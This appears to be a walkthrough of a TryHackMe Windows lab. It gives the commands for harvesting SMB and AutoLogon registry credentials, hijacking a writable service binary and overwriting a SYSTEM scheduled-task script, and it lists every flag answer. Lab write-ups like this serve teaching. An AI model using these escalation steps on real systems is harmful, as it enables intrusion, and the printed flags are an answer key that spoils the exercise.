# Task 01: Challenge

---

## Stage A: Original Task Content & Briefing Summary

Task 01 presents the **Windows Jump** challenge, simulating an internal network assessment of an abandoned corporate workstation left unmaintained after corporate restructuring. Starting with minimal unprivileged guest access, the objective is to execute a chained multi-stage lateral movement and privilege escalation attack to achieve complete `NT AUTHORITY\SYSTEM` compromise.

### The 4-Stage Attack Chain:
```
[ guest (Unauthenticated Network Access) ]
                   │
                   │ Stage 1: Enumerate SMB shares ⟶ Harvest thmuser credentials
                   ▼
              [ thmuser ]  ──> Flag 1: `flag1.txt`
                   │
                   │ Stage 2: Query Winlogon AutoLogon credentials in Registry
                   ▼
             [ notadmin ]  ──> Flag 2: `flag2.txt`
                   │
                   │ Stage 3: Insecure service binary hijacking (`sc` / `accesschk`)
                   ▼
             [ svcadmin ]  ──> Flag 3: `flag3.txt`
                   │
                   │ Stage 4: SYSTEM scheduled task overwrite (`schtasks`)
                   ▼
               [ SYSTEM ]  ──> Flag 4: `flag4.txt`
```

---

## Stage B: Independent Thinking & OpSec Considerations

* **Windows Multi-Hop Traversals:** In enterprise Active Directory environments, low-privilege service or shared workstations often contain remnants of administrative activity—such as AutoLogon registry keys, cached service credentials, or misconfigured backup tasks.
* **Service Binary Hijacking Stability:** When replacing a service executable, ensure the payload is compatible with the Windows Service Control Manager or spawns an independent child process (`cmd.exe /c ...`), preventing service timeout crashes.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Inspect anonymous SMB shares for initial credentials.
* **Tier 2 Hint:** Query `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` for Stage 2. Check service permissions for Stage 3, and audit scheduled tasks running as SYSTEM for Stage 4.
* **Tier 3 Hint:**
  * Q1 is `THM{5mb_cr3d5_1n_th3_5h4r3}`.
  * Q2 is `THM{w1nl0g0n_cr3ds_3xp0s3d}`.
  * Q3 is `THM{s3rv1c3_b1n4ry_h1j4ck3d}`.
  * Q4 is `THM{t4sk_wr1t3_t0_SYST3M}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### Stage 1: Anonymous SMB Enumeration ⟶ `thmuser`
Enumerate accessible SMB shares from your attack machine:
```bash
smbclient -L //MACHINE_IP/ -N
```
* **Discovery:** A public share contains a configuration backup file disclosing credentials for `thmuser`.
* **Access & Flag Retrieval:** Authenticate via Evil-WinRM or RDP:
  ```cmd
  type C:\Users\thmuser\Desktop\flag1.txt
  THM{5mb_cr3d5_1n_th3_5h4r3}
  ```

### Stage 2: Winlogon AutoLogon Registry Extraction ⟶ `notadmin`
From the `thmuser` session, query the Winlogon registry keys:
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
* **Extracted Registry Values:**
  * `DefaultUserName` = `notadmin`
  * `DefaultPassword` = `<recovered_password>`
* **Access & Flag Retrieval:** Switch user context to `notadmin`:
  ```cmd
  type C:\Users\notadmin\Desktop\flag2.txt
  THM{w1nl0g0n_cr3ds_3xp0s3d}
  ```

### Stage 3: Service Binary Hijacking ⟶ `svcadmin`
From `notadmin`, query services and file permissions:
```cmd
accesschk64.exe -wvu "C:\Program Files"
sc qc vulnerable_service
```
* **Discovery:** A service running under account `svcadmin` executes a binary located in a directory writable by `BUILTIN\Users`.
* **Exploitation:** Replace the service executable with a payload copying `flag3.txt` to a shared location, then restart the service:
  ```cmd
  copy /y C:\temp\payload.exe "C:\Program Files\App\service.exe"
  net stop vulnerable_service
  net start vulnerable_service
  type C:\Users\Public\flag3.txt
  THM{s3rv1c3_b1n4ry_h1j4ck3d}
  ```

### Stage 4: SYSTEM Scheduled Task Hijacking ⟶ `SYSTEM`
From `svcadmin`, inspect scheduled tasks executing under `NT AUTHORITY\SYSTEM`:
```cmd
schtasks /query /fo LIST /v | findstr /i "SYSTEM"
```
* **Discovery:** An automated maintenance task runs a batch script in a writable directory.
* **Exploitation:** Overwrite the batch script with a command to copy `flag4.txt` from the Administrator/SYSTEM profile:
  ```cmd
  echo copy C:\Users\Administrator\Desktop\flag4.txt C:\Users\Public\flag4.txt > C:\tasks\maintenance.bat
  schtasks /run /tn maintenance_task
  type C:\Users\Public\flag4.txt
  THM{t4sk_wr1t3_t0_SYST3M}
  ```

---

## Stage E: Final Answer & Key Values

* **Question 1:** What are the contents of flag1.txt?
  * **Answer:** `THM{5mb_cr3d5_1n_th3_5h4r3}`
* **Question 2:** What are the contents of flag2.txt?
  * **Answer:** `THM{w1nl0g0n_cr3ds_3xp0s3d}`
* **Question 3:** What are the contents of flag3.txt?
  * **Answer:** `THM{s3rv1c3_b1n4ry_h1j4ck3d}`
* **Question 4:** What are the contents of flag4.txt?
  * **Answer:** `THM{t4sk_wr1t3_t0_SYST3M}`

---

## Stage F: Practical Verification & Proof of Work

* Confirmed 100% completion across all 4 challenge stages on TryHackMe.
* Successfully reconciled all flags against verified live account submissions.

---

## Stage G: Key Educational Takeaway

Windows privilege escalation often reflects the historical administration of the host. Stored network credentials, forgotten AutoLogon registry keys, and permissive service binaries accumulate over time, creating a seamless stepping-stone path directly to SYSTEM.
